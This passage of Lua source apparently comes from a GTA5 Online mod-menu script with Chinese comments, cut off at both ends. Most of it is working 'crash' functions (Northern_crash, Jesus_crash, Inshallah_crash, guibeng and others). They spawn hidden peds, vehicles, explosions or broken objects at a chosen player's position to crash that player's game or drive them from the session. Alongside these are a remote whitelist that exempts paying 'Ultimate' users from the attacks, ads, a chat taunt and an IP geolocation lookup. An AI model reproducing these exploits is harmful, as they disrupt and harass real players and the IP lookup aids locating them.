        util.toast("未能移除玩家,正在使用cs_taostranslator模型")
        local PED4 = create_ped(26,util.joaat("cs_taostranslator"),TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
            util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
            util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
            util.yield(5000)
        delete_entity(PED4)
    end
    if players.exists(pid) then
        util.toast("未能移除玩家,正在使用cs_taostranslator2模型")
        local PED5 = create_ped(26,util.joaat("cs_taostranslator2"),TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
            util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
            util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
            util.yield(5000)
        delete_entity(PED5)
    end
    if players.exists(pid) then
        util.toast("未能移除玩家,正在使用cs_tenniscoach模型")
        local PED6 = create_ped(26,util.joaat("cs_tenniscoach"),TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
            util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
            util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
            util.yield(5000)
        delete_entity(PED6)
    end
    if players.exists(pid) then
        util.toast("未能移除玩家,正在使用cs_wade模型")
        local PED7 = create_ped(26,util.joaat("cs_wade"),TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
            util.yield(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
            util.yield(1000)
        FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
            util.yield(5000)
        delete_entity(PED7)
    end
    util.yield(2000)
    if not players.exists(pid) then
        util.toast("成功移除玩家")
    end
end
----北域崩溃
function Northern_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local michael = util.joaat("player_zero")
    request_model(michael)
    local ped = entities.create_ped(0, michael, pos, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 5, 0)
    util.yield()
    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    delete_entity(ped)
end
----回弹崩溃
function Rebound_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("mp_m_freemode_01")
    local veh_mdl = util.joaat("taxi")
    request_model(veh_mdl)
    request_model(mdl)
        for i = 1, 10 do
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(1000)
            delete_entity(jesus)
            delete_entity(veh)
        end  
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end
----黄昏崩溃
function nightfull_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local player = PLAYER.GET_PLAYER_PED(pid)
    local mdl = util.joaat("cs_taostranslator2")
    request_model(mdl)
    local ped = {}
    for i = 1, 10 do 
        local coord = ENTITY.GET_ENTITY_COORDS(player, true)
        local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
        ped[i] = entities.create_ped(0, mdl, coord, 0)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
        WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
        ENTITY.SET_ENTITY_VISIBLE(ped[i], true)
        util.yield(25)
    end
    util.yield(2500)
    for i = 1, 10 do
        delete_entity(ped[i])
        util.yield(25)
    end
end
----Inshallah crash
function Inshallah_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local PED1  = create_ped(28,-1011537562,pos.x,pos.y,pos.z,0)
    local PED2  = create_ped(28,-541762431,pos.x,pos.y,pos.z,0)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
    WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
    util.yield(1000)
    TASK.TASK_THROW_PROJECTILE(PED1,pos.x,pos.y,pos.z,0,0)
    TASK.TASK_THROW_PROJECTILE(PED2,pos.x,pos.y,pos.z,0,0)
end
--碎片崩溃
function v1_frag(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    for i = 1, 10 do
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    end
end
----悲伤的耶稣崩溃
function Jesus_crash(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("u_m_m_jesus_01")
    local veh_mdl = util.joaat("oppressor")
    request_models(veh_mdl, mdl)

    for i = 1, 10 do
        local veh = entities.create_vehicle(veh_mdl, pos, 0)
        local jesus = entities.create_ped(2, mdl, pos, 0)
        PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
        TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
        util.yield(100)
        delete_entity(jesus, veh)
    end
end
--Memoir超级崩溃/v3
function Memoir(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
        util.yield(20)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()),-1087,-3012,13.94)
        util.yield(500)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
        util.yield(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID()))
end
---鬼崩
function guibeng(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local Spawned_tr3 = create_vehicle(util.joaat("tr3"), pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
    local Spawned_chernobog = create_vehicle(util.joaat("chernobog"), pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
    local Spawned_avenger = create_vehicle(util.joaat("avenger"), pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true, 0)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
    for i = 0, 100 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)
        ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
        util.yield(10 * math.random())
        ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
        util.yield(10 * math.random())
    end
end




----苦力怕小丑(MC里的爬行者)
function get_random_offset_from_entity(entity, minDistance, maxDistance)
	local pos = ENTITY.GET_ENTITY_COORDS(entity, false)
	return get_random_offset_in_range(pos, minDistance, maxDistance)
end
function get_random_offset_in_range(coords, minDistance, maxDistance)
	local radius = random_float(minDistance, maxDistance)
	local angle = random_float(0, 2 * math.pi)
	local delta = v3.new(math.cos(angle), math.sin(angle), 0.0)
	delta:mul(radius)
	coords:add(delta)
	return coords
end
function random_float(min, max)
	return min + math.random() * (max - min)
end
function creep(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local hash <const> = util.joaat("s_m_y_clown_01")
		local explosion <const> = Effect.new("scr_rcbarry2", "scr_exp_clown")
		local appears <const> = Effect.new("scr_rcbarry2",  "scr_clown_appears")
		request_model(hash)
		local player = PLAYER.GET_PLAYER_PED(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player, false)
		local coord = get_random_offset_from_entity(player, 5.0, 8.0)
		coord.z = coord.z - 1.0
		local ped = entities.create_ped(0, hash, coord, 0.0)
		request_ptfx_asset(appears.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(appears.asset)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			appears.name,
			ped,
			0.0, 0.0, -1.0,
			0.0, 0.0, 0.0,
			0.5, false, false, false
		)
		set_entity_face_entity(ped, player, false)
		PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
		TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, pos.x, pos.y, pos.z, 5.0, 0, false, 0, 0.0)
		local dest = pos
		PED.SET_PED_KEEP_TASK(ped, true)
		AUDIO.STOP_PED_SPEAKING(ped, true)
		util.create_tick_handler(function()
			pos = ENTITY.GET_ENTITY_COORDS(ped, true)
			local targetPos = players.get_position(pid)
			if not ENTITY.DOES_ENTITY_EXIST(ped) or PED.IS_PED_FATALLY_INJURED(ped) then
				return false
			elseif pos:distance(targetPos) > 150 and
			request_control(ped) then
				delete_entity(ped)
				return false
			elseif pos:distance(targetPos) < 3.0 and request_control(ped) then
				request_ptfx_asset(explosion.asset)
				GRAPHICS.USE_PARTICLE_FX_ASSET(explosion.asset)
				GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
					explosion.name,
					pos.x, pos.y, pos.z,
					0.0, 0.0, 0.0,
					1.0,
					false, false, false, false
				)
				FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, true, 1.0, false)
				ENTITY.SET_ENTITY_VISIBLE(ped, false, false)
				delete_entity(ped)
				return false
			elseif targetPos:distance(dest) > 3.0 and request_control(ped) then
				dest = targetPos
				TASK.TASK_GO_TO_COORD_ANY_MEANS(ped, targetPos.x, targetPos.y, targetPos.z, 5.0, 0, false, 0, 0.0)
			end
		end)
end


------------------载具枪
local setIntoVehicle = false
local vehgun_handle = 0
local vehgun_Hash = MISC.GET_HASH_KEY(Objvehicles[1])
function Vehicle_gun_opt(opt)
    local vehicle = Objvehicles[opt]
    vehgun_Hash = util.joaat(vehicle)
end
function Vehicle_gun_into(toggle)
    setIntoVehicle = toggle
end
function Vehicle_gun()
    local camRot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local coords = get_offset_from_camera(16.0)
    if PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_ID()) then
        if not ENTITY.DOES_ENTITY_EXIST(vehgun_handle) then
            vehgun_handle = create_vehicle(vehgun_Hash, coords.x, coords.y, coords.z, camRot.z)
            ENTITY.SET_ENTITY_ALPHA(vehgun_handle, 153, true)
            ENTITY.SET_ENTITY_COLLISION(vehgun_handle, false, false)
            ENTITY.SET_CAN_CLIMB_ON_ENTITY(vehgun_handle, false)
        else
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehgun_handle, coords.x, coords.y, coords.z, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(vehgun_handle, camRot.x, camRot.y, camRot.z, 0, true)
        end
    elseif ENTITY.DOES_ENTITY_EXIST(vehgun_handle) then 
        delete_entity(vehgun_handle)
    end
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local veh = create_vehicle(vehgun_Hash, coords.x, coords.y, coords.z, camRot.z)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(veh), true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, coords.x, coords.y, coords.z, false, false, false)
        ENTITY.SET_ENTITY_ROTATION(veh, camRot.x, camRot.y, camRot.z, 0, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 200.0)
        if not setIntoVehicle then
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 2)
        else
            VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, true)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), veh, -1)
        end
    end
end


---- 定义扩展版凯撒加密支持所有可打印字符
function caesarEncrypt(text, shift)
    local result = ""
    for i = 1, #text do
        local char = text:sub(i, i)
        local byte = string.byte(char)
        -- 只加密可打印的 ASCII 字符 (32-126)
        if byte >= 32 and byte <= 126 then
            -- 位移并循环
            local shifted = (byte - 32 + shift) % 95 + 32
            result = result .. string.char(shifted)
        else
            -- 不可打印字符保持不变
            result = result .. char
        end
    end
    return result
end
-- 定义凯撒解密函数
function caesarDecrypt(text, shift)
    local result = ""
    for i = 1, #text do
        local char = text:sub(i, i)
        local byte = string.byte(char)
        -- 只解密可打印的 ASCII 字符 (32-126)
        if byte >= 32 and byte <= 126 then
            -- 反向位移并循环
            local shifted = (byte - 32 - shift) % 95 + 32
            result = result .. string.char(shifted)
        else
            -- 不可打印字符保持不变
            result = result .. char
        end
    end
    return result
end


----攻击嘲讽
local U_hack_list = {}
local taunt_text = "你正在攻击尊贵的GTA5在线小助手用户! 请停止你的恶意行为\n--------¦Sakura"
function change_ridicule()
    local label = util.register_label("嘲讽内容")
    local input = get_input_from_screen_keyboard(label, 50, taunt_text)
    if input == "" then return end
    taunt_text = input
end
function Attack_ridicule()
    ----判断攻击
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(pid,SYSTEM.SHIFT_LEFT(0x03, 1)) or players.is_marked_as_attacker(pid,SYSTEM.SHIFT_LEFT(0x04, 1)) or players.is_marked_as_attacker(pid,SYSTEM.SHIFT_LEFT(0x05, 1)) or players.is_marked_as_attacker(pid,SYSTEM.SHIFT_LEFT(0x0C, 1)) or players.is_marked_as_attacker(pid,SYSTEM.SHIFT_LEFT(0x0D, 1)) or players.is_marked_as_attacker(pid,SYSTEM.SHIFT_LEFT(0x0E, 1)) then
            if not table_find(U_hack_list, pid) then
                chat.send_message(PLAYER.GET_PLAYER_NAME(pid)..taunt_text,false,true,true)
                table.insert(U_hack_list, pid)
            end
        end
    end
    ----重置记录
    for i, ID in pairs(U_hack_list) do
        if PLAYER.GET_PLAYER_PED(ID) == 0 then
            U_hack_list[i] = nil
        end
    end
end


-- 启用/禁用呼出电话
function cellphone_state(toggle)
    local cellphone_script = "cellphone_controller"
    local cellphone_hash = util.joaat(cellphone_script)
    if toggle then
        --enable, restart script
        if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(cellphone_hash) <= 0 then
            SCRIPT1.REQUEST_SCRIPT(cellphone_script)
            if SCRIPT1.HAS_SCRIPT_LOADED(cellphone_script) then
                SYSTEM.START_NEW_SCRIPT(cellphone_script, 1424)
                SCRIPT1.SET_SCRIPT_AS_NO_LONGER_NEEDED(cellphone_script)
            end
        end
    else
        --disable
        if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(cellphone_hash) > 0 then
            MISC.TERMINATE_ALL_SCRIPTS_WITH_THIS_NAME(cellphone_script)
        end
    end
end

----终极用户检测
local complete_locked = false
UltimateUser = {}
function is_UltimateUser(pid)
    local name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
    if pid == PLAYER.PLAYER_ID() then
        return table_find(UltimateUser, name)
    else
        name = PLAYER.GET_PLAYER_NAME(pid)
        return table_find(UltimateUser, name)
    end
    return false
end
function lockapp()
    for k, vel in pairs(appmenu.Ultion) do
        if (vel.visible ~= nil) and (vel.visible ~= "") then
            vel.visible = false
        end
    end
    complete_locked = true
end
function userfunc()
    --普通用户
    if not is_UltimateUser(PLAYER.PLAYER_ID()) then
        --广告展示
        if os.time() < 1758739950 then
            notification(string.format("~bold~%s", "https://fuzhuzhijia.vip"), HudColour.blue, "~y~旧梦卡网")
        end
        if os.time() < 1758739950 then
            notification(string.format("~bold~%s", "定制广告位如果你需要可直接联系呆呆"), HudColour.blue, "~y~通知")
        end
        --测试版,当需要测试时开启
        --util.stop_script()
    end
    --UltimateUser
    if is_UltimateUser(PLAYER.PLAYER_ID()) then
        --功能开发与锁定
        util.create_tick_handler(function()
            --终极开放扩展
            for k, vel in pairs(appmenu.Ultion) do
                if (vel.visible ~= nil) and (vel.visible ~= "") then
                    vel.visible = true
                end
            end
            --锁定扩展
            for k, vel in pairs(appmenu.Ultioff) do
                if (vel.visible ~= nil) and (vel.visible ~= "") then
                    vel.visible = false
                end
            end
            ----解锁结束停止线程
            if complete_locked then return false end
        end)
    end
end
--请求用户
util.create_thread(function()
    local MyUser
    notify("请稍等")
    async_http.init("http://gta.cnsakura.top", "/api.php",function(info,header,response)
        if response == 200 then
            MyUser = JsonToTable(info)
            if MyUser == {} or MyUser == nil or MyUser == "" then 
                util.toast("身份解析异常")
                util.stop_script()
            end
            UltimateUser = MyUser
            if is_UltimateUser(PLAYER.PLAYER_ID()) then
                notification("~y~~bold~ 已激活Ultimate身份", HudColour.blue)
            end
            userfunc()
            util.create_tick_handler(function()
                if UltimateUser ~= MyUser then --防篡改
                    UltimateUser = MyUser
                    util.yield(1000)
                end
            end)
        else
            util.toast("无法验证身份")
            util.stop_script()
        end
    end, function(reason)
        util.toast("请求发送失败")
        util.stop_script()
    end);async_http.dispatch()
end)


----版本检测
function check_game_version()
    local gversion = 1.69
    local online_v = tonumber(NETWORK.GET_ONLINE_VERSION())
    if online_v > gversion then
        notification("~y~~bold~ 当前版本已不再完全适配游戏版本", HudColour.blue)
    end
end
----版本验证
async_http.init("http://check.cnsakura.top", "/stand/versions.txt",function(body, header_fields, status)
    if status == 200 and body ~= nil then
        local version = tonumber(body:match("(.*):.*")) --使用模式匹配找到冒号及其左边的部分
        if version > SCRIPT_VERSION then
            notification("~y~~bold~检测到更新=.=", HudColour.blue)
            util.stop_script()
        end
    end
end);async_http.dispatch()


----军演轰炸
function Military_exercises()
    local pos = v3.new()
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) then

        --飞机ped创建
        local pedt = {}
        local planet = {}
        local drivers = {}
        for i = 1, 12 do

            --生成目标
            pedt[i] = create_ped(1, -927261102, pos.x + math.random(-10, 10), pos.y + math.random(-10, 10), pos.z, math.random(360))
            ENTITY.SET_ENTITY_VISIBLE(pedt[i], false, false)
            ENTITY.SET_ENTITY_INVINCIBLE(pedt[i],true)
            ENTITY.FREEZE_ENTITY_POSITION(pedt[i], true)
            calm_ped(pedt[i], true)

            --生成飞机
            local end_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedt[1], 0, 500, 300)
            local start_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pedt[1], 0 + math.random(-20, 20), -2000 + math.random(-20, 20), 300)
            planet[i] = create_vehicle(util.joaat("Lazer"), start_pos.x, start_pos.y, start_pos.z, 0)
            set_entity_face_entity(planet[i], pedt[1])
            ENTITY.SET_ENTITY_INVINCIBLE(planet[i],true)
            ENTITY.SET_ENTITY_COLLISION(planet[i], false, true)
            VEHICLE.SET_VEHICLE_ENGINE_ON(planet[i], true, true, 0)

            --创建飞机驾驶员并驾驶
            drivers[i] = PED.CREATE_RANDOM_PED_AS_DRIVER(planet[i], 1)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(drivers[i], true)
            TASK.TASK_PLANE_MISSION(drivers[i], planet[i], 0, 0, end_pos.x, end_pos.y, end_pos.z, 4, 80.0, 50.0, -1.0, 400.0, 300.0, true)
            PED.SET_PED_KEEP_TASK(drivers[i], true)

            PED.SET_PED_COMBAT_ABILITY(drivers[i], 3)
            PED.SET_PED_COMBAT_RANGE(drivers[i], 4)
            PED.SET_PED_SEEING_RANGE(drivers[i], 1000)
            PED.SET_PED_HEARING_RANGE(drivers[i], 1000)
            TASK.TASK_COMBAT_PED(drivers[i], pedt[i], 0, 16)
        end

        --领头飞机光标
        local blip = HUD.ADD_BLIP_FOR_ENTITY(planet[1])
        HUD.SET_BLIP_COLOUR(blip, 5)
        --创建相机
        local Cam = CAM.CREATE_CAMERA(26379945, true)
        CAM.HARD_ATTACH_CAM_TO_ENTITY(Cam, planet[5], -10, 0, 0, 0, -10, 6, true)
        util.show_corner_help(string.format("按下 ~%s~ 切换飞机视角","INPUT_VEH_HORN"))
        while true do

            --控制飞机路径和速度
            for i = 1, 12 do
                VEHICLE.SET_VEHICLE_FORWARD_SPEED(planet[i], 200 / 3.6)
                set_entity_face_entity(planet[i], pedt[1], false)
            end

            --绘制距离
            local disa = ENTITY.GET_ENTITY_COORDS(planet[1])
            local disb = ENTITY.GET_ENTITY_COORDS(pedt[1])
            local distance = Get_distance(disa, disb, false)
            draw_string("~b~喷气机距离 ~w~"..math.floor(distance).." 米", 0.03, 0.2, 0.4, 1)

            --相机控制
            if PAD.IS_CONTROL_PRESSED(0, 46) then
                CAM.RENDER_SCRIPT_CAMS(true, false, 3000, 1, 0, 0)
                CAM.SHAKE_CAM(Cam, "DRUNK_SHAKE", 1)
            end
            --恢复相机
            if distance < 1000 then
                CAM.RENDER_SCRIPT_CAMS(false, false, 3000, 1, 0, 0)
                CAM.DESTROY_CAM(Cam, true)
            end

            if distance < 20 then
                for i = 1, 12 do
                    delete_entity(drivers[i])
                    delete_entity(planet[i])
                    delete_entity(pedt[i])
                end
                break
            end
            if not ENTITY.DOES_ENTITY_EXIST(planet[1]) then
                break
            end
            util.yield()
        end
    end
end

----IP查询
function QueryIP(IP)
    local tab = string.split(IP,".")
    if #tab ~= 4 or tonumber(string.format(tab[1])) > 255 or tonumber(string.format(tab[1])) < 1 then
        notification("~y~~bold~键入IP不合法!", HudColour.blue)
        return
    end
    async_http.init("http://ip-api.com","/json/"..IP .. "?lang=zh-CN",function(info,header,response)
        if response == 200 and info ~= "" then
            local IPtable = JsonToTable(info)
            if IPtable.status == "success" then
                local str = "~y~IP: ~w~" .. IPtable.query .. 
                            "\n~y~国家: ~w~" .. IPtable.country .. 
                            "\n~y~国家代码: ~w~" .. IPtable.countryCode .. 
                            "\n~y~区域: ~w~" .. IPtable.region .. 
                            "\n~y~区域名称: ~w~" .. IPtable.regionName ..
                            "\n~y~城市: ~w~" .. IPtable.city .. 
                            "\n~y~邮政编码: ~w~" .. IPtable.zip .. 
                            "\n~y~时区: ~w~" .. IPtable.timezone .. 
                            "\n~y~ISP: ~w~" .. IPtable.isp .. 
                            "\n~y~时区: ~w~" .. IPtable.timezone
                notify(str)
            end
        end
    end);async_http.dispatch()
end


----距离比例尺
function override_lodscale(val)
    while val do
        if val ~= 1 then
            STREAMING.OVERRIDE_LODSCALE_THIS_FRAME(val)
        else
            break
        end
        util.yield()
    end
end

----死亡警告
function dead_warning()
    if ENTITY.IS_ENTITY_DEAD(PLAYER.PLAYER_PED_ID()) then
        local strings = "~o~不玩原神\n死了吧-~o~"..PLAYER.GET_PLAYER_NAME(PLAYER.PLAYER_ID())
        local scaleform_movie = GRAPHICS.REQUEST_SCALEFORM_MOVIE("MP_BIG_MESSAGE_FREEMODE")
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform_movie, "SHOW_SHARD_WASTED_MP_MESSAGE")
        GRAPHICS.DRAW_SCALEFORM_MOVIE(scaleform_movie, 0.5, 0.5, 1, 1, 255, 225, 255, 255)
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(strings)
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD(scaleform_movie)
    end
end

---载具跳跃
function get_vehicle_player_is_in(player)
	local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
	if PED.IS_PED_IN_ANY_VEHICLE(targetPed, false) then
		return PED.GET_VEHICLE_PED_IS_IN(targetPed, false)
	end
	return 0
end

--发送崔佛
function addBlipForEntity(entity, blipSprite, colour)
	local blip = HUD.ADD_BLIP_FOR_ENTITY(entity)
	HUD.SET_BLIP_SPRITE(blip, blipSprite)
	HUD.SET_BLIP_COLOUR(blip, colour)
	HUD.SHOW_HEIGHT_ON_BLIP(blip, false)
	HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(ENTITY.GET_ENTITY_HEADING(entity)))
	NETWORK.SET_NETWORK_ID_CAN_MIGRATE(entity, false)
	util.create_thread(function()
		while not ENTITY.IS_ENTITY_DEAD(entity) do
			local heading = ENTITY.GET_ENTITY_HEADING(entity)
			HUD.SET_BLIP_ROTATION(blip, SYSTEM.CEIL(heading))
			util.yield()
			if ENTITY.IS_ENTITY_DEAD(entity) or ENTITY.IS_ENTITY_DEAD(entity) or not ENTITY.DOES_ENTITY_EXIST(entity) or VEHICLE.GET_VEHICLE_ENGINE_HEALTH(entity) <= 0 then
				util.remove_blip(blip)
				util.yield()
			end
		end
	end)
	return blip
end
function getOffsetFromEntityGivenDistance(entity, distance)
	local pos = ENTITY.GET_ENTITY_COORDS(entity, 0)
	local theta = (math.random() + math.random(0, 1)) * math.pi --returns a random angle between 0 and 2pi (exclusive)
	local coords = vector3.new(pos.x + distance * math.cos(theta),pos.y + distance * math.sin(theta),pos.z)
	return coords
end
function send_Angry_Trevor(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicleHash = util.joaat("bodhi2")
    local pedHash = -1686040670
    request_models(vehicleHash, pedHash)
    local targetPed = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
    local vehicle = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
    if not ENTITY.DOES_ENTITY_EXIST(vehicle) then
        return
    end
    local offset = getOffsetFromEntityGivenDistance(vehicle, 50.0)
    local outCoords = v3.new()
    local outHeading = memory.alloc()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(offset.x, offset.y, offset.z, outCoords, outHeading, 1, 3.0, 0) then
        ENTITY.SET_ENTITY_COORDS(vehicle, v3.getX(outCoords), v3.getY(outCoords), v3.getZ(outCoords))
        ENTITY.SET_ENTITY_HEADING(vehicle, memory.read_float(outHeading))
